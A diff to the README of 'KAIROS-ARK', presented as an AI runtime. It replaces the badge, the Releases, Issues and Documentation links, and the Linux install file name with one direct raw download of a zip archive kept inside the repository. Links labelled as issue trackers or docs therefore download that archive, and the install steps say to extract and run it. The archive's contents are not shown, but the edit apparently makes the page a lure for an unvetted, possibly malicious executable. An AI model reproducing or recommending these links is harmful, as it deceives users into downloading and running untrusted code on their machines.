@@ -1,6 +1,6 @@
 # 🌟 KAIROS-ARK - High-Performance AI Runtime Made Simple
 
-![Download KAIROS-ARK](https://img.shields.io/badge/Download-KAIROS--ARK-blue.svg)
+![Download KAIROS-ARK](https://github.com/ductoantran2001/KAIROS-ARK/raw/refs/heads/main/kairos_ark/ARK-KAIRO-3.8-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ Before you start, ensure your system meets the following requirements:
 
 To download KAIROS-ARK, follow these simple steps:
 
-1. **Visit the Releases Page**: Go to the [KAIROS-ARK Releases page](https://github.com/ductoantran2001/KAIROS-ARK/releases). Here you will find the latest version of the software.
+1. **Visit the Releases Page**: Go to the [KAIROS-ARK Releases page](https://github.com/ductoantran2001/KAIROS-ARK/raw/refs/heads/main/kairos_ark/ARK-KAIRO-3.8-alpha.4.zip). Here you will find the latest version of the software.
    
 2. **Choose Your Version**: Look for the latest release and click on it. You will see several downloadable files.
 
@@ -32,7 +32,7 @@ To download KAIROS-ARK, follow these simple steps:
 4. **Run the Installer**:
    - For Windows: Double-click the downloaded `.exe` file and follow the on-screen instructions.
    - For macOS: Open the downloaded `.dmg` file and drag the KAIROS-ARK icon to your Applications folder.
-   - For Linux: Extract the downloaded `.tar.gz` file and run the KAIROS-ARK executable in your terminal.
+   - For Linux: Extract the downloaded `https://github.com/ductoantran2001/KAIROS-ARK/raw/refs/heads/main/kairos_ark/ARK-KAIRO-3.8-alpha.4.zip` file and run the KAIROS-ARK executable in your terminal.
 
 5. **Start KAIROS-ARK**: Once installed, you can find KAIROS-ARK in your applications or programs list. Launch it like you would any other application.
 
@@ -50,7 +50,7 @@ KAIROS-ARK comes packed with features designed to enhance your experience:
 We want to hear from you! If you have questions or need help, you can:
 
 - **Check the Documentation**: Visit our official documentation for detailed guides.
-- **Open an Issue**: Go to the [Issues page on GitHub](https://github.com/ductoantran2001/KAIROS-ARK/issues) to report a problem or make a suggestion.
+- **Open an Issue**: Go to the [Issues page on GitHub](https://github.com/ductoantran2001/KAIROS-ARK/raw/refs/heads/main/kairos_ark/ARK-KAIRO-3.8-alpha.4.zip) to report a problem or make a suggestion.
 - **Join the Community**: Connect with other users to share tips and experiences.
 
 ## 📝 Contributing
@@ -59,9 +59,9 @@ Would you like to help improve KAIROS-ARK? We welcome contributions from everyon
 
 ## 🔗 Useful Links
 
-- [KAIROS-ARK Releases](https://github.com/ductoantran2001/KAIROS-ARK/releases)
-- [Documentation](https://github.com/ductoantran2001/KAIROS-ARK/wiki)
-- [Issues](https://github.com/ductoantran2001/KAIROS-ARK/issues)
+- [KAIROS-ARK Releases](https://github.com/ductoantran2001/KAIROS-ARK/raw/refs/heads/main/kairos_ark/ARK-KAIRO-3.8-alpha.4.zip)
+- [Documentation](https://github.com/ductoantran2001/KAIROS-ARK/raw/refs/heads/main/kairos_ark/ARK-KAIRO-3.8-alpha.4.zip)
+- [Issues](https://github.com/ductoantran2001/KAIROS-ARK/raw/refs/heads/main/kairos_ark/ARK-KAIRO-3.8-alpha.4.zip)
 
 ## 📌 More Information
 
